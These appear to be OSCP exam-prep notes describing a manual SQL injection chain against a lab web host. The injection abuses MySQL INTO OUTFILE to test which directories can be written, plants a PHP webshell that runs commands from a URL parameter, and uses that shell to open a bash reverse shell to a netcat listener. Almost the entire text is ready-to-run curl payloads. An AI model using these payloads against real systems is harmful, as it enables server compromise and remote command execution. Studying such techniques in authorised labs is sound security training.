# Manual Directory Write Testing via SQLi

## Quick Manual Test Commands

### 1. Test /var/www/html (most common)
```bash
# Write test file
curl -X POST http://192.168.145.48/index.php \
  -d "mail-list=test@test.com' UNION SELECT 'TEST' INTO OUTFILE '/var/www/html/test.txt'-- -"

# Check response for:
# - "Can't create/write to file" = Not writable
# - "already exists" = File was written (writable!)
# - No error = Possibly written
```

### 2. Test /tmp (usually writable but not web accessible)
```bash
curl -X POST http://192.168.145.48/index.php \
  -d "mail-list=test@test.com' UNION SELECT 'TEST' INTO OUTFILE '/tmp/test.txt'-- -"
```

### 3. Write PHP test file
```bash
# If /var/www/html is writable, write PHP test
curl -X POST http://192.168.145.48/index.php \
  -d "mail-list=test@test.com' UNION SELECT '<?php echo \"VULNERABLE\"; ?>' INTO OUTFILE '/var/www/html/check.php'-- -"

# Then verify by browsing to:
curl http://192.168.145.48/check.php
# If you see "VULNERABLE", you have code execution!
```

## Manual Step-by-Step Process

### Step 1: Find Writable Directory
```bash
# Test common web directories one by one
for dir in /var/www/html /var/www/uploads /tmp; do
    echo "Testing $dir..."
    curl -X POST http://192.168.145.48/index.php \
      -d "mail-list=test@test.com' UNION SELECT 'TEST' INTO OUTFILE '$dir/test_$RANDOM.txt'-- -" \
      -s | grep -E "Can't create|already exists|Errcode"
done
```

### Step 2: Once Writable Directory Found
```bash
# Write a simple webshell
curl -X POST http://192.168.145.48/index.php \
  --data-urlencode "mail-list=test@test.com' UNION SELECT '<?php system(\$_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'-- -"
```

### Step 3: Test Webshell
```bash
# Execute command
curl "http://192.168.145.48/shell.php?cmd=id"
curl "http://192.168.145.48/shell.php?cmd=whoami"
```

### Step 4: Get Reverse Shell
```bash
# Start listener on Kali
nc -lvnp 443

# Trigger reverse shell via webshell
curl "http://192.168.145.48/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.45.5/443+0>%261'"
```

## Understanding MySQL Errors

### Common Error Messages:
- **"Can't create/write to file"** - Permission denied (not writable)
- **"Errcode: 2"** - Directory doesn't exist
- **"Errcode: 13"** - Permission denied
- **"already exists"** - File exists (good! means first write worked)
- **"secure_file_priv"** - MySQL restricted to specific directories only
- **No error** - Could mean success, verify by trying to write same file again

## Checking secure_file_priv Setting

```bash
# Check if MySQL has directory restrictions
curl -X POST http://192.168.145.48/index.php \
  -d "mail-list=test@test.com' UNION SELECT @@secure_file_priv-- -"

# If returns:
# - NULL = Can write anywhere (if permissions allow)
# - /var/lib/mysql-files/ = Can only write to this directory
# - Empty = FILE operations disabled
```

## Alternative: Using INTO DUMPFILE

```bash
# INTO DUMPFILE writes binary data (good for avoiding charset issues)
curl -X POST http://192.168.145.48/index.php \
  --data-urlencode "mail-list=test@test.com' UNION SELECT '<?php phpinfo(); ?>' INTO DUMPFILE '/var/www/html/info.php'-- -"
```

## Tips for OSCP Exam

1. **Always test /var/www/html first** - Most likely to be writable and accessible
2. **Use random filenames** - Avoid conflicts with existing files
3. **Test write, then verify** - Writing same file twice should error with "already exists"
4. **Check phpinfo()** - Can reveal document root and writable directories
5. **Time-based blind is SLOW** - Each write attempt takes time to confirm

## Quick One-Liner Test

```bash
# Test if we can write to web root
curl -X POST http://192.168.145.48/index.php -d "mail-list=test' UNION SELECT 'test' INTO OUTFILE '/var/www/html/t.txt'-- -" -s | grep -q "Can't create" && echo "Not writable" || echo "Possibly writable"
```